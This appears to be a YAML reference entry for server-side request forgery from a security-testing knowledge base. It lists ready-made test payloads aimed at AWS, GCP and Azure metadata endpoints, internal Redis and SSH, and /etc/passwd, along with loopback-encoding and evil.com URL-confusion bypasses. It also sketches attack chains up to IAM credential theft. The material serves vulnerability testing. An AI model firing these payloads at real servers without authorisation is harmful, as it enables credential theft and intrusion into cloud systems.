name: SSRF (Server-Side Request Forgery)
cwe: CWE-918
cvss_range: "7.2-10.0"
description: Making the server issue requests to internal/cloud resources

indicators:
  - URL parameters: url=, webhook=, callback=, redirect=, src=, href=, link=
  - Import/fetch features (import from URL, fetch metadata, preview link)
  - PDF/image generators that accept URLs
  - Webhook configuration endpoints

test_vectors:
  - http://169.254.169.254/latest/meta-data/ (AWS metadata)
  - http://metadata.google.internal/computeMetadata/v1/ (GCP)
  - http://169.254.169.254/metadata/instance (Azure)
  - http://localhost:PORT/admin (internal services)
  - http://127.0.0.1:6379/ (Redis)
  - http://0.0.0.0:22/ (SSH)
  - file:///etc/passwd

bypass_techniques:
  - http://[::1]:80/ (IPv6)
  - http://0177.0.0.1/ (octal)
  - http://0x7f000001/ (hex)
  - http://127.1/ (short form)
  - http://localtest.me/ (DNS resolves to 127.0.0.1)
  - http://evil.com@127.0.0.1/ (URL confusion)
  - Redirect chain: evil.com → 127.0.0.1

chain_opportunities:
  - SSRF → cloud metadata → IAM credentials → full AWS access
  - SSRF → internal admin panel → RCE
  - SSRF → internal Redis → session hijack
